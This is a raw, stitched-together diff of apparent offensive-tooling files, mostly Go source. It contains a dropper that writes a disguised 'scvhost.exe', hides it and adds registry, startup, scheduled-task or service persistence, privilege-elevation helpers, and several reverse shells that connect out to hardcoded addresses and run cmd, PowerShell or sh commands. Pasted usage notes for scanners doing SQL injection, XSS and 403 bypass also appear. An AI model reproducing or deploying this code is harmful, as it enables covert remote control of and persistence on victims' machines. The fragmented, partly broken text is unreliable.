-import (
-	"fmt"
-	"os"
-	"os/exec"
-	"syscall"
-	"time"
-	"unsafe"
-)
-
-// Function to check if the error is a privilege error
-func isPrivilegeError(err error) bool {
-	// This is a simplistic check. You might need a more robust approach based on specific error codes.
-	return err != nil && err.Error() == "The requested operation requires elevation."
-}
-
-// Function to run a command with elevated privileges
-func runWithElevatedPrivileges(cmd *exec.Cmd) error {
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	cmd.SysProcAttr.CmdLine = "/c " + cmd.Args[0]
-	cmd.SysProcAttr.CreationFlags = syscall.CREATE_NEW_CONSOLE
-
-	return cmd.Run()
-}
-
-// Function to perform the task
-func performTask() error {
-	// Example task: Copy a file
-	srcFile := "source.txt"
-	dstFile := "destination.txt"
-
-	// Attempt to perform the task with current privileges
-	err := copyFile(srcFile, dstFile)
-	if err == nil {
-		return nil
-	}
-
-	// Check if it's a privilege error
-	if isPrivilegeError(err) {
-		fmt.Println("Privilege error encountered. Attempting to elevate privileges...")
-
-		// Re-run the task with elevated privileges
-		cmd := exec.Command("powershell", "-Command", fmt.Sprintf("Start-Process -FilePath '%s' -ArgumentList '%s' -Verb RunAs", os.Args[0], os.Args[0]))
-		err := runWithElevatedPrivileges(cmd)
-		if err != nil {
-			return fmt.Errorf("failed to elevate privileges and retry task: %w", err)
-		}
-		return nil
-	}
-
-	return err
-}
-
-// Function to copy a file
-func copyFile(src, dst string) error {
-	input, err := os.ReadFile(src)
-	if err != nil {
-		return err
-	}
-	err = os.WriteFile(dst, input, 0644)
-	return err
-}
-
-func main() {
-	err := performTask()
-	if err != nil {
-		fmt.Printf("Error performing task: %v\n", err)
-	} else {
-		fmt.Println("Task completed successfully.")
-	}
-}
-
-
-
-
-package main
-
-import (
-	"fmt"
-	"os"
-	"syscall"
-	"unsafe"
-)
-
-// Constants for ShellExecute
-const (
-	SW_HIDE           = 0
-	SW_SHOWNORMAL     = 1
-	SW_SHOWMINIMIZED  = 2
-	SW_SHOWMAXIMIZED  = 3
-	SW_SHOWNOACTIVATE = 4
-	SW_SHOW           = 5
-)
-
-// Import ShellExecute from Shell32.dll
-var (
-	shell32            = syscall.NewLazyDLL("shell32.dll")
-	shell32ShellExecute = shell32.NewProc("ShellExecuteW")
-)
-
-// Function to perform the file copy task
-func copyFile(src, dst string) error {
-	input, err := os.ReadFile(src)
-	if err != nil {
-		return err
-	}
-	err = os.WriteFile(dst, input, 0644)
-	return err
-}
-
-// Function to run a command with elevated privileges using ShellExecute
-func runWithElevatedPrivileges(exePath string, args string) error {
-	ret, _, _ := shell32ShellExecute.Call(
-		0,
-		syscall.StringToUTF16Ptr("runas"),   // Operation to perform
-		syscall.StringToUTF16Ptr(exePath),    // Path to the executable
-		syscall.StringToUTF16Ptr(args),       // Command line arguments
-		nil,                                  // Default directory
-		nil,                                  // Show command
-		SW_SHOWNORMAL,                        // Show window
-	)
-
-	if ret == 0 || ret == 31 { // 31 indicates that the operation was canceled by the user
-		return fmt.Errorf("elevation canceled or failed")
-	}
-	return nil
-}
-
-// Main function
-func main() {
-	srcFile := "source.txt"
-	dstFile := "destination.txt"
-
-	err := copyFile(srcFile, dstFile)
-	if err != nil {
-		fmt.Println("Error with current privileges:", err)
-		fmt.Println("Attempting to elevate privileges...")
-
-		// Run with elevated privileges
-		err = runWithElevatedPrivileges(os.Args[0], "")
-		if err != nil {
-			fmt.Printf("Error performing task with elevated privileges: %v\n", err)
-			return
-		}
-
-		// Retry the task after elevation
-		err = copyFile(srcFile, dstFile)
-		if err != nil {
-			fmt.Printf("Error performing task after elevation: %v\n", err)
-		} else {
-			fmt.Println("Task completed successfully after elevation.")
-		}
-	} else {
-		fmt.Println("Task completed successfully.")
-	}
-}
-
-
-
-
-
-
-# EXAMPLE
-
-Scan for subdomains and save the output to a file.
-```
-python3 spyhunt.py -s yahoo.com --save filename.txt
-```
-Scan for javascript files 
-```
-python3 spyhunt.py -j yahoo.com
-```
-Scan for dns records
-```
-python3 spyhunt.py -d domains.txt
-```
-Scan for FavIcon hashes 
-```
-python3 spyhunt.py -fi domain.com
-```
-Web Crawler
-```
-python3 spyhunt.py -wc https://www.domain.com
-```
-Broken Links
-```
-python3 spyhunt.py -b https://www.domain.com
-```
-Cors Misconfiguration Scan
-```
-python3 spyhunt.py -co domains.txt
-```
-Host Header Injection
-```
-python3 spyhunt.py -hh domains.txt
-```
-Directory Brute Forcing
-```
-python3 spyhunt.py --directorybrute domain.com --wordlist list.txt --threads 50 -e php,txt,html -x 404,403
-```
-Directory Brute Forcing with no extensions
-```
-python3 spyhunt.py --directorybrute domain.com --wordlist list.txt --threads 50 -x 404,403
-```
-Scanning a subnet
-```
-python3 spyhunt.py --cidr_notation IP/24 --ports 80,443 --threads 200
-```
-Directory Traversal
-```
-python3 spyhunt.py -ph domain.com?id=
-```   
-sql injection
-```
-python3 spyhunt.py -sqli domain.com?id=1
-```   
-xss
-```
-python3 spyhunt.py -xss domain.com?id=1
-```
-JavaScript file scanning for sensitive info
-```
-python3 spyhunt.py -javascript domain.com
-
-
-
-### Usage
-```
-Usage: ./pentestlab.sh {list|status|info|start|startpublic|stop} [projectname]
-
- This scripts uses docker and hosts alias to make web apps available on localhost"
-
-Ex.
-./pentestlab.sh list
-   List all available projects  
-
-./pentestlab.sh status
-   Show status for all projects  
-
-./pentestlab.sh start bwapp
-   Start docker container with bwapp and make it available on localhost  
-
-./pentestlab.sh startpublic bwapp
-   Start docker container with bwapp and make it available on machine IP 
-
-./pentestlab.sh stop bwapp
-   Stop docker container
-
-./pentestlab.sh info bwapp
-   Show information about bwapp project
-```
-
- ### Dockerfiles from
- DVWA                   - Ryan Dewhurst (vulnerables/web-dvwa)  
- Mutillidae II          - OWASP Project (citizenstig/nowasp)  
- bWapp                  - Rory McCune (raesene/bwapp)  
- Webgoat(s)             - OWASP Project  
- Juice Shop             - OWASP Project (bkimminich/juice-shop)  
- Vulnerable Wordpress   - github.com/wpscanteam/VulnerableWordpress  
- Security Ninjas        - OpenDNS Security Ninjas  
- Altoro Mutual          - github.com/hclproducts/altoroj  
- Vulnerable GraphQL API - Carve Systems LLC (carvesystems/vulnerable-graphql-api)
-
-github references means the docker is custom created and hosted in dockerhub.
-
-
- # EXAMPLE
- 
- domains to check
- ```
- python3 forbiddenpass.py -d domains.txt
- ```
- domains to check with a path
- ```
- python3 forbiddenpass.py -d domains.txt --path login
- ```
- scan a single target
- ```
- python3 forbiddenpass.py -t https://site
- ```
- scan a single target with a path
- ```
-  python3 forbiddenpass.py -t https://site --path login
-  
-  
-  
-  
-package main
-
-import (
-    "fmt"
-    "log"
+    "bufio"
+    "net"
     "os"
     "os/exec"
-    "runtime"
-    "encoding/base64"
-    "syscall"
-    "unsafe"
-    "path/filepath"
-)
-
-var (
-    shell string
-    flag  string
-)
-
-func init() {
-    switch runtime.GOOS {
-    case "windows":
-        shell = "cmd"
-        flag = "/c"
-    default:
-        shell = "bash"
-        flag = "-c"
-    }
-}
-
-func Popen(command string, args ...interface{}) error {
-    cmd := fmt.Sprintf(command, args...)
-    process := exec.Command(shell, flag, cmd)
-    process.Stdin = os.Stdin
-    process.Stdout = os.Stdout
-    process.Stderr = os.Stderr
-
-    return process.Run()
-}
-
-func setRegistryPersistence(exePath string) error {
-    regKeyPath := `Software\Microsoft\Windows\CurrentVersion\Run`
-    regValueName := `scvhost`
-
-    // Open the registry key
-    regKey, err := syscall.OpenKey(syscall.HKEY_CURRENT_USER, syscall.StringToUTF16Ptr(regKeyPath), syscall.KEY_SET_VALUE)
-    if err != nil {
-        return fmt.Errorf("failed to open registry key: %v", err)
-    }
-    defer syscall.RegCloseKey(regKey)
-
-    // Set the registry value
-    exePathUTF16 := syscall.StringToUTF16(exePath)
-    err = syscall.RegSetValueEx(regKey, syscall.StringToUTF16Ptr(regValueName), 0, syscall.REG_SZ, (*byte)(unsafe.Pointer(&exePathUTF16[0])), uint32(len(exePathUTF16)*2))
-    if err != nil {
-        return fmt.Errorf("failed to set registry value: %v", err)
-    }
-
-    return nil
-}
-
-func addToStartup(exePath string) error {
-    startupFolder := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
-    shortcutPath := filepath.Join(startupFolder, "scvhost.lnk")
-
-    // Creating a shortcut requires a different method; here we simply create a text file as a placeholder
-    return os.WriteFile(shortcutPath, []byte(fmt.Sprintf("[InternetShortcut]\nURL=%s", exePath)), 0644)
-}
-
-func createScheduledTask(exePath string) error {
-    script := fmt.Sprintf(`$action = New-ScheduledTaskAction -Execute "%s"
-$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "scvhostTask" -Description "Runs scvhost at startup"`, exePath)
-
-    // Execute the PowerShell script
-    cmd := exec.Command("powershell", "-Command", script)
-    output, err := cmd.CombinedOutput()
-    if err != nil {
-        return fmt.Errorf("failed to create scheduled task: %s", err)
-    }
-    fmt.Println(string(output))
-    return nil
-}
-
-func createWindowsService(exePath string) error {
-    serviceName := "scvhostService"
-    cmd := fmt.Sprintf(`sc create %s binPath= "%s" start= auto`, serviceName, exePath)
-    
-    // Execute the command to create the service
-    process := exec.Command("cmd", "/C", cmd)
-    output, err := process.CombinedOutput()
-    if err != nil {
-        return fmt.Errorf("failed to create Windows service: %s", err)
-    }
-    fmt.Println(string(output))
-    return nil
-}
-
-func main() {
-    encodedExeData := "africanas" // Replace with actual Base64-encoded executable data
-
-    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
-    if err != nil {
-        log.Fatalf("Failed decoding Base64 executable string: %s", err)
-    }
-
-    exeOutputPath := `C:\Users\Public\Libraries\scvhost.exe`
-
-    // Remove existing executable if it exists
-    if _, err := os.Stat(exeOutputPath); !os.IsNotExist(err) {
-        if err := os.Remove(exeOutputPath); err != nil {
-            log.Printf("Failed to remove file: %s", err)
-            if err := Popen("taskkill /im scvhost.exe /f"); err != nil {
-                log.Printf("Failed to kill process: %s", err)
-            }
-            if err := os.Remove(exeOutputPath); err != nil {
-                log.Printf("Failed to remove file: %s", err)
-            }
-        }
-    }
-
-    // Write the new executable file
-    if err := os.WriteFile(exeOutputPath, exeData, 0644); err != nil {
-        log.Fatalf("Failed to write file: %s", err)
-    }
-
-    // Set file attributes to hidden
-    if err := Popen("attrib +h %s", exeOutputPath); err != nil {
-        log.Printf("Failed to set file attributes: %s", err)
-    }
-
-    // Choose a persistence method:
-    // Uncomment one of the following based on your chosen method
-
-    // 1. Registry Persistence
-    if err := setRegistryPersistence(exeOutputPath); err != nil {
-        log.Fatalf("Failed to set registry persistence: %s", err)
-    }
-
-    // 2. Startup Folder Persistence
-    // if err := addToStartup(exeOutputPath); err != nil {
-    //     log.Fatalf("Failed to add to startup folder: %s", err)
-    // }
-
-    // 3. Scheduled Task Persistence
-    // if err := createScheduledTask(exeOutputPath); err != nil {
-    //     log.Fatalf("Failed to create scheduled task: %s", err)
-    // }
-
-    // 4. Windows Service Persistence
-    // if err := createWindowsService(exeOutputPath); err != nil {
-    //     log.Fatalf("Failed to create Windows service: %s", err)
-    // }
-}
-
-
-
-/root/.africana/output/malware_runner_reg.go:45:28: undefined: syscall.OpenKey
-/root/.africana/output/malware_runner_reg.go:53:19: undefined: syscall.RegSetValueEx
-
-
-
-package main
-
-import (
-    "encoding/base64"
-    "fmt"
-    "log"
-    "os"
-    "os/exec"
-    "runtime"
-)
-
-var (
-    shell string
-    flag  string
-)
-
-func init() {
-    switch runtime.GOOS {
-    case "windows":
-        shell = "cmd"
-        flag = "/c"
-    default:
-        shell = "bash"
-        flag = "-c"
-    }
-}
-
-func Popen(command string, args ...interface{}) error {
-    cmd := fmt.Sprintf(command, args...)
-    process := exec.Command(shell, flag, cmd)
-    process.Stdin = os.Stdin
-    process.Stdout = os.Stdout
-    process.Stderr = os.Stderr
-
-    return process.Run()
-}
-
-func setRegistryPersistence(exePath string) error {
-    regKeyPath := `Software\Microsoft\Windows\CurrentVersion\Run`
-    regValueName := `scvhost`
-
-    // Use reg command to set the registry key
-    cmd := fmt.Sprintf(`reg add "%s" /v "%s" /t REG_SZ /d "%s" /f`, regKeyPath, regValueName, exePath)
-    return Popen(cmd)
-}
-
-func main() {
-    encodedExeData := "africanas" // Replace with actual Base64-encoded executable data
-
-    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
-    if err != nil {
-        log.Fatalf("Failed decoding Base64 executable string: %s", err)
-    }
-
-    exeOutputPath := `C:\Users\Public\Libraries\scvhost.exe`
-
-    // Remove existing executable if it exists
-    if _, err := os.Stat(exeOutputPath); !os.IsNotExist(err) {
-        if err := os.Remove(exeOutputPath); err != nil {
-            log.Printf("Failed to remove file: %s", err)
-            if err := Popen("taskkill /im scvhost.exe /f"); err != nil {
-                log.Printf("Failed to kill process: %s", err)
-            }
-            if err := os.Remove(exeOutputPath); err != nil {
-                log.Printf("Failed to remove file: %s", err)
-            }
-        }
-    }
-
-    // Write the new executable file
-    if err := os.WriteFile(exeOutputPath, exeData, 0644); err != nil {
-        log.Fatalf("Failed to write file: %s", err)
-    }
-
-    // Set file attributes to hidden
-    if err := Popen("attrib +h %s", exeOutputPath); err != nil {
-        log.Printf("Failed to set file attributes: %s", err)
-    }
-
-    // Set registry key for persistence
-    if err := setRegistryPersistence(exeOutputPath); err != nil {
-        log.Fatalf("Failed to set registry persistence: %s", err)
-    }
-}
-
-
-
-package main
-
-import (
-    "encoding/base64"
-    "fmt"
-    "log"
-    "os"
-    "os/exec"
-    "runtime"
-)
-
-var (
-    shell string
-    flag  string
-)
-
-func init() {
-    switch runtime.GOOS {
-    case "windows":
-        shell = "powershell"
-        flag = "-Command"
-    default:
-        shell = "bash"
-        flag = "-c"
-    }
-}
-
-func Popen(command string, args ...interface{}) error {
-    cmd := fmt.Sprintf(command, args...)
-    process := exec.Command(shell, flag, cmd)
-    process.Stdin = os.Stdin
-    process.Stdout = os.Stdout
-    process.Stderr = os.Stderr
-
-    return process.Run()
-}
-
-func setRegistryPersistence(exePath string) error {
-    regKeyPath := `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`
-    regValueName := `scvhost`
-
-    // Use PowerShell to set the registry key
-    cmd := fmt.Sprintf(`Set-ItemProperty -Path "%s" -Name "%s" -Value "%s"`, regKeyPath, regValueName, exePath)
-    return Popen(cmd)
-}
-
-func main() {
-    encodedExeData := "africanas" // Replace with actual Base64-encoded executable data
-
-    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
-    if err != nil {
-        log.Fatalf("Failed decoding Base64 executable string: %s", err)
-    }
-
-    exeOutputPath := `C:\Users\Public\Libraries\scvhost.exe`
-
-    // Remove existing executable if it exists
-    if _, err := os.Stat(exeOutputPath); !os.IsNotExist(err) {
-        if err := os.Remove(exeOutputPath); err != nil {
-            log.Printf("Failed to remove file: %s", err)
-            if err := Popen("Stop-Process -Name scvhost -Force"); err != nil {
-                log.Printf("Failed to kill process: %s", err)
-            }
-            if err := os.Remove(exeOutputPath); err != nil {
-                log.Printf("Failed to remove file: %s", err)
-            }
-        }
-    }
-
-    // Write the new executable file
-    if err := os.WriteFile(exeOutputPath, exeData, 0644); err != nil {
-        log.Fatalf("Failed to write file: %s", err)
-    }
-
-    // Set file attributes to hidden
-    if err := Popen(`attrib +h "%s"`, exeOutputPath); err != nil {
-        log.Printf("Failed to set file attributes: %s", err)
-    }
-
-    // Set registry key for persistence
-    if err := setRegistryPersistence(exeOutputPath); err != nil {
-        log.Fatalf("Failed to set registry persistence: %s", err)
-    }
-}
-package main
-
-import (
-    "encoding/base64"
-    "fmt"
-    "log"
-    "os"
-    "os/exec"
-    "runtime"
-)
-
-var (
-    shell string
-    flag  string
-)
-
-func init() {
-    switch runtime.GOOS {
-    case "windows":
-        shell = "powershell"
-        flag = "-Command"
-    default:
-        shell = "bash"
-        flag = "-c"
-    }
-}
-
-func Popen(command string, args ...interface{}) error {
-    cmd := fmt.Sprintf(command, args...)
-    process := exec.Command(shell, flag, cmd)
-    process.Stdin = os.Stdin
-    process.Stdout = os.Stdout
-    process.Stderr = os.Stderr
-
-    return process.Run()
-}
-
-func setRegistryPersistence(exePath string) error {
-    regKeyPath := `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`
-    regValueName := `scvhost`
-
-    // Use PowerShell to set the registry key
-    cmd := fmt.Sprintf(`Set-ItemProperty -Path "%s" -Name "%s" -Value "%s"`, regKeyPath, regValueName, exePath)
-    return Popen(cmd)
-}
-
-func main() {
-    encodedExeData := "africanas" // Replace with actual Base64-encoded executable data
-
-    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
-    if err != nil {
-        log.Fatalf("Failed decoding Base64 executable string: %s", err)
-    }
-
-    exeOutputPath := `C:\Users\Public\Libraries\scvhost.exe`
-
-    // Remove existing executable if it exists
-    if _, err := os.Stat(exeOutputPath); !os.IsNotExist(err) {
-        if err := os.Remove(exeOutputPath); err != nil {
-            log.Printf("Failed to remove file: %s", err)
-            if err := Popen("Stop-Process -Name scvhost -Force"); err != nil {
-                log.Printf("Failed to kill process: %s", err)
-            }
-            if err := os.Remove(exeOutputPath); err != nil {
-                log.Printf("Failed to remove file: %s", err)
-            }
-        }
-    }
-
-    // Write the new executable file
-    if err := os.WriteFile(exeOutputPath, exeData, 0644); err != nil {
-        log.Fatalf("Failed to write file: %s", err)
-    }
-
-    // Set file attributes to hidden
-    if err := Popen(`attrib +h "%s"`, exeOutputPath); err != nil {
-        log.Printf("Failed to set file attributes: %s", err)
-    }
-
-    // Set registry key for persistence
-    if err := setRegistryPersistence(exeOutputPath); err != nil {
-        log.Fatalf("Failed to set registry persistence: %s", err)
-    }
-}
-
-
-
-package main
-
-import (
-    "encoding/base64"
-    "fmt"
-    "log"
-    "os"
-    "os/exec"
-    "runtime"
-)
-
-var (
-    shell string
-    flag  string
-)
-
-func init() {
-    switch runtime.GOOS {
-    case "windows":
-        shell = "cmd"
-        flag = "/c"
-    default:
-        shell = "bash"
-        flag = "-c"
-    }
-}
-
-func Popen(command string, args ...interface{}) error {
-    cmd := fmt.Sprintf(command, args...)
-    process := exec.Command(shell, flag, cmd)
-    process.Stdin = os.Stdin
-    process.Stdout = os.Stdout
-    process.Stderr = os.Stderr
-
-    return process.Run()
-}
-
-func setRegistryPersistence(exePath string) error {
-    regKeyPath := `Software\Microsoft\Windows\CurrentVersion\Run`
-    regValueName := `scvhost`
-
-    // Use reg command to set the registry key
-    cmd := fmt.Sprintf(`reg add "%s" /v "%s" /t REG_SZ /d "%s" /f`, regKeyPath, regValueName, exePath)
-    return Popen(cmd)
-}
-
-func main() {
-    encodedExeData := "africanas" // Replace with actual Base64-encoded executable data
-
-    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
-    if err != nil {
-        log.Fatalf("Failed decoding Base64 executable string: %s", err)
-    }
-
-    exeOutputPath := `C:\Users\Public\Libraries\scvhost.exe`
-
-    // Remove existing executable if it exists
-    if _, err := os.Stat(exeOutputPath); !os.IsNotExist(err) {
-        if err := os.Remove(exeOutputPath); err != nil {
-            log.Printf("Failed to remove file: %s", err)
-            if err := Popen("taskkill /im scvhost.exe /f"); err != nil {
-                log.Printf("Failed to kill process: %s", err)
-            }
-            if err := os.Remove(exeOutputPath); err != nil {
-                log.Printf("Failed to remove file: %s", err)
-            }
-        }
-    }
-
-    // Write the new executable file
-    if err := os.WriteFile(exeOutputPath, exeData, 0644); err != nil {
-        log.Fatalf("Failed to write file: %s", err)
-    }
-
-    // Set file attributes to hidden
-    if err := Popen("attrib +h %s", exeOutputPath); err != nil {
-        log.Printf("Failed to set file attributes: %s", err)
-    }
-
-    // Set registry key for persistence
-    if err := setRegistryPersistence(exeOutputPath); err != nil {
-        log.Fatalf("Failed to set registry persistence: %s", err)
-    }
-}
-
-
-package main
-
-import (
-	"bufio"
-	"fmt"
-	"io"
-	"net"
-	"os"
-	"os/exec"
-	"time"
-	"strings"
-)
-
-// Constants
-const (
-	serverAddress = "192.168.117.128:9001"
-	reconnectDelay = 10 * time.Second
-)
-
-func main() {
-	for {
-		// Connect to the server
-		conn, err := net.Dial("tcp", serverAddress)
-		if err != nil {
-			fmt.Printf("Error connecting to server: %v\n", err)
-			time.Sleep(reconnectDelay)
-			continue
-		}
-		defer conn.Close()
-		fmt.Println("Connected to server")
-
-		// Create buffered reader and writer
-		reader := bufio.NewReader(conn)
-		writer := bufio.NewWriter(conn)
-
-		// Process incoming data
-		for {
-			data, err := reader.ReadString('\n')
-			if err != nil {
-				if err == io.EOF {
-					fmt.Println("Connection closed by server")
-				} else {
-					fmt.Printf("Error reading from connection: %v\n", err)
-				}
-				break
-			}
-
-			// Execute the command received
-			cmd := exec.Command("powershell", "-Command", data)
-			output, err := cmd.CombinedOutput()
-			if err != nil {
-				output = []byte(err.Error())
-			}
-
-			// Get the current working directory
-			currentDir, dirErr := os.Getwd()
-			if dirErr != nil {
-				currentDir = "unknown"
-			}
-
-			// Format and send the response back to the server
-			response := fmt.Sprintf("%sPS %s> \n", output, currentDir)
-			_, err = writer.WriteString(response)
-			if err != nil {
-				fmt.Printf("Error writing to connection: %v\n", err)
-				break
-			}
-			writer.Flush()
-		}
-
-		// Sleep before reconnecting
-		fmt.Println("Disconnected from server, reconnecting in 10 seconds...")
-		time.Sleep(reconnectDelay)
-	}
-}
-
-
-
-package main
-
-import (
-	"bufio"
-	"net"
-	"os"
-	"os/exec"
-	"time"
+    "time"
 )
 
 const (
-	serverAddress = "192.168.117.128:9001"
-	reconnectDelay = 10 * time.Second
+    serverAddress = "192.168.117.128:9001"
+    reconnectDelay = 10 * time.Second
 )
 
 func main() {
-	for {
-		// Connect to the server
-		conn, err := net.Dial("tcp", serverAddress)
-		if err != nil {
-			time.Sleep(reconnectDelay)
-			continue
-		}
-		defer conn.Close()
+    for {
+        // Connect to the server
+        conn, err := net.Dial("tcp", serverAddress)
+        if err != nil {
+            time.Sleep(reconnectDelay)
+            continue
+        }
+        defer conn.Close()
 
-		// Create buffered reader and writer
-		reader := bufio.NewReader(conn)
-		writer := bufio.NewWriter(conn)
+        // Create buffered reader and writer
+        reader := bufio.NewReader(conn)
+        writer := bufio.NewWriter(conn)
 
-		// Process incoming data
-		for {
-			data, err := reader.ReadString('\n')
-			if err != nil {
-				break
-			}
+        // Process incoming data
+        for {
+            data, err := reader.ReadString('\n')
+            if err != nil {
+                break
+            }
 
-			// Execute the command received
-			cmd := exec.Command("powershell", "-Command", data)
-			output, _ := cmd.CombinedOutput()
+            // Execute the command received
+            cmd := exec.Command("powershell", "-Command", data)
+            output, _ := cmd.CombinedOutput()
 
-			// Get the current working directory
-			currentDir, _ := os.Getwd()
+            // Get the current working directory
+            currentDir, _ := os.Getwd()
 
-			// Format and send the response back to the server
-			response := formatResponse(output, currentDir)
-			writer.WriteString(response)
-			writer.Flush()
-		}
+            // Format and send the response back to the server
+            response := formatResponse(output, currentDir)
+            writer.WriteString(response)
+            writer.Flush()
+        }
 
-		// Sleep before reconnecting
-		time.Sleep(reconnectDelay)
-	}
+        // Sleep before reconnecting
+        time.Sleep(reconnectDelay)
+    }
 }
 
 // Format the response
 func formatResponse(output []byte, currentDir string) string {
-	return string(output) + "PS " + currentDir + "> \n"
+    return string(output) + "PS " + currentDir + "> \n"
 }
 
 
@@ -4063,462 +2952,212 @@ func formatResponse(output []byte, currentDir string) string {
 package main
 
 import (
-	"bufio"
-	"fmt"
-	"net"
-	"os"
-	"os/exec"
-	"runtime"
-	"strings"
+    "bufio"
+    "fmt"
+    "net"
+    "os"
+    "os/exec"
+    "runtime"
+    "strings"
 )
 
 const (
-	ip   = "127.0.0.1"
-	port = "9001"
+    ip   = "127.0.0.1"
+    port = "9001"
 )
 
 func getArchMessageFormat(msg string) (string, []string) {
-	var exe string
-	switch runtime.GOOS {
-	case "windows":
-		exe = "cmd"
-		return exe, []string{"/c", msg}
-	case "linux":
-		exe = "/bin/sh"
-		return exe, []string{"-c", msg}
-	default:
-		fmt.Println("Unsupported OS")
-		os.Exit(1)
-	}
-	return "", nil
-}
-
-func main() {
-	// Connect to the server
-	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
-	if err != nil {
-		fmt.Println("Error connecting to server:", err)
-		os.Exit(1)
-	}
-	defer conn.Close()
-
-	for {
-		// Print current working directory
-		cwd, _ := os.Getwd()
-		fmt.Fprintf(conn, "\n%s> ", cwd)
-
-		// Read command from server
-		msg, err := bufio.NewReader(conn).ReadString('\n')
-		if err != nil {
-			fmt.Println("Error reading from connection:", err)
-			return
-		}
-
-		// Execute the command
-		msg = strings.TrimSpace(msg) // Remove any trailing newline
-		exe, args := getArchMessageFormat(msg)
-		out, err := exec.Command(exe, args...).CombinedOutput()
-		if err != nil {
-			out = []byte(fmt.Sprintf("Error executing command: %v", err))
-		}
-
-		// Send command output back to server
-		fmt.Fprintf(conn, "%s\n", out)
-	}
-}
-
-
-
-
-package main
-
-import (
-	"net"
-	"os/exec"
-	"syscall"
-	"log"
-)
-
-func main() {
-	// Replace "IP:PORT" with the actual IP address and port of the listener
-	conn, err := net.Dial("tcp", "IP:PORT")
-	if err != nil {
-		log.Fatalf("Failed to connect: %v", err)
-	}
-	defer conn.Close()
-
-	// Prepare the command to execute
-	cmd := exec.Command("cmd.exe") // Use "cmd.exe" for Windows
-
-	// Hide the command prompt window
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	
-	// Redirect the command's I/O to the TCP connection
-	cmd.Stdin = conn
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-
-	// Run the command
-	err = cmd.Run()
-	if err != nil {
-		log.Fatalf("Command execution failed: %v", err)
-	}
-}
-
-
-
-package main
-
-import (
-	"net"
-	"os/exec"
-	"syscall"
-)
-
-func main() {
-	c, _ := net.Dial("tcp", "IP:PORT")
-	cmd := exec.Command("cmd")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
-	cmd.Run()
-}
-
-
-func reverse(host string) {
-	for {
-		c, err := net.Dial("tcp", host)
-		if nil != err {
-			if nil != c {
-				c.Close()
-			}
-			time.Sleep(time.Minute)
-			reverse(host)
-		}
-
-		cmd := exec.Command("/bin/sh")
-		cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
-		cmd.Run()
-		c.Close()
-	}
-}
-
-
-
-
-package main
-
-const (
-	// Shell constants
-	commandPrompt = "C:\\Windows\\System32\\cmd.exe"
-	powerShell    = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-)
-
-func GetSystemShell() string {
-	if exists(powerShell) {
-		return powerShell
-	}
-	return commandPrompt
-}
-
-
-
-
-package main
-
-import (
-	"log"
-	"net"
-	"os"
-	"os/exec"
-)
-
-const (
-	// Read buffer
-	readBufSize = 128
-)
-
-func exists(path string) bool {
-	_, err := os.Stat(path)
-	if err == nil {
-		return true
-	}
-	if os.IsNotExist(err) {
-		return false
-	}
-	return true
-}
-
-// ReverseShell - Execute a reverse shell to host
-func reverseShell(command string, send chan<- []byte, recv <-chan []byte) {
-	var cmd *exec.Cmd
-	cmd = exec.Command(command)
-
-	stdin, _ := cmd.StdinPipe()
-	stdout, _ := cmd.StdoutPipe()
-	stderr, _ := cmd.StderrPipe()
-
-	go func() {
-		for {
-			select {
-			case incoming := <-recv:
-				log.Printf("[*] shell stdin write: %v", incoming)
-				stdin.Write(incoming)
-			}
-		}
-	}()
-
-	go func() {
-		for {
-			buf := make([]byte, readBufSize)
-			stderr.Read(buf)
-			log.Printf("[*] shell stderr read: %v", buf)
-			send <- buf
-		}
-	}()
-
-	cmd.Start()
-	for {
-		buf := make([]byte, readBufSize)
-		stdout.Read(buf)
-		log.Printf("[*] shell stdout read: %v", buf)
-		send <- buf
-	}
-}
-
-func main() {
-	conn, _ := net.Dial("tcp", "127.0.0.1:8080")
-	shellPath := GetSystemShell()
-
-	send := make(chan []byte)
-	recv := make(chan []byte)
-
-	go reverseShell(shellPath, send, recv)
-
-	go func() {
-		for {
-			data := make([]byte, readBufSize)
-			conn.Read(data)
-			recv <- data
-		}
-	}()
-
-	for {
-		select {
-		case outgoing := <-send:
-			conn.Write(outgoing)
-		}
-	}
-
-}
-
-
-
-package main
-
-import (
-	"os/exec"
-    "net"
-    "bufio"
-)
-
-const (
-	protocol = "tcp"
-	ip = "10.0.0.234"
-	port = "4444"
-	bash = "/bin/bash"
-	sh = "/bin/sh"
-	commandPrompt = "C:\\Windows\\System32\\cmd.exe"
-	powerShell    = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-)
-
-func getSystemShell() string {
-	if exists(bash){
-		return bash
-	}
-	if exists(sh){
-		return sh
-	}
-	if exists(commandPrompt) {
-		return commandPrompt
-	}
-	if exists(powerShell){
-		return powerShell
-	}
-	return ""
-}
-
-func exists(path string) bool {
-	_, err := os.Stat(path)
-	if err == nil {
-		return true
-	}
-	if os.IsNotExist(err) {
-		return false
-	}
-	return true
-}
-
-func main() {
-	c, _ := net.Dial(protocol, ip+":"+port)
-	prompt := getSystemShell()
-	for {
-		status, _ := bufio.NewReader(c).ReadString('\n')
-		cmd := exec.Command(prompt, "/C", status)
-		out, _ := cmd.Output()
-		_, _ = c.Write(out)
-	}
-}
-
-
-package main
-
-import (
-    "encoding/base64"
-    "fmt"
-    "os"
-    "os/exec"
-    "runtime"
-)
-
-var (
-    shell string
-    flag  string
-)
-
-func init() {
+    var exe string
     switch runtime.GOOS {
     case "windows":
-        shell = "powershell"
-        flag = "-c"
+        exe = "cmd"
+        return exe, []string{"/c", msg}
+    case "linux":
+        exe = "/bin/sh"
+        return exe, []string{"-c", msg}
     default:
-        shell = "bash"
-        flag = "-c"
